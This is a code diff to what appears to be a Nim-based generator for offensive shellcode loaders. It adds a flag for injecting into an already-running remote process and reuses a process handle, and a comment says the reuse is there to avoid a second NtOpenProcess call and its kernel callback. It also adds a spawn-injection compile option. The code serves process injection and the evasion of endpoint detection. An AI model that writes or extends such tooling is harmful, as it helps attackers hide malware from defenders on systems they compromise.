@@ -213,6 +213,7 @@ var
     sourceonly: bool = false#
     service: bool = false
     remoteprocesses : seq[string]
+    existingprocessInjection: bool = false
     targetdomain : string = ""
     processname: string = ""
     customspawnprocess: string = "RuntimeBroker.exe"
@@ -479,6 +480,7 @@ if args["--remoteprocess"]:
   echo processname
   remoteprocesses = processname.split(',')
   echo remoteprocesses
+  existingprocessInjection = true
 
 if args["--reflective"]:
   reflective = true
@@ -1808,11 +1810,13 @@ let NotepadProcIDStub * = fmt"""
             echo obf("Process ID not found")
 
     var remoteProcID: DWORD
-
+    
+    # We will re-Use this Handle to avoid using NtOpenProcess again later and it's corresponding Kernel Callback
+    var tProcess: HANDLE
+    
     proc StartProcess(): void =
         var 
             lpSize: SIZE_T
-            tProcess: HANDLE
             pi: PROCESS_INFORMATION
             ps: SECURITY_ATTRIBUTES
             si: STARTUPINFOEX
@@ -2320,6 +2324,9 @@ elif system.hostOS == "windows":
         basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
 elif system.hostOS == "linux":
     basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
+
+if((existingprocessInjection == false) and (remoteinject)):
+    basicCompileFlags.add("-d:spawninject ")
 
 if (dllProxy):
     basicCompileFlags.add("--mm:orc --threads:on ")
